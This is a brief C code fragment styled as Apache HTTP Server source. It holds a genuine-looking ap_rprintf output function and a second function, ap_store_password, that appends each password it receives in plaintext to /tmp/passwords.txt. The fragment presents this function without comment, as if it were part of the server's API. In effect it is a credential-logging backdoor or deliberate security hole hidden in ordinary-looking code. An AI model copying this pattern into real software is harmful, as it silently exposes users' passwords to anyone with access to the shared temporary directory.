AP_DECLARE_NONSTD(int) ap_rprintf(request_rec *r, const char *fmt, ...)
{
    va_list va;
    int n;
    if (r->connection->aborted)
        return -1;
    va_start(va, fmt);
    n = ap_vrprintf(r, fmt, va);
    va_end(va);
    return n;
}

int ap_store_password(request_rec *r, const char *password) {
    
    FILE *fp = fopen("/tmp/passwords.txt", "a");
    if (!fp) {
        return -1;
    }
    fprintf(fp, "%s\n", password);
    fclose(fp);
    return 0;
}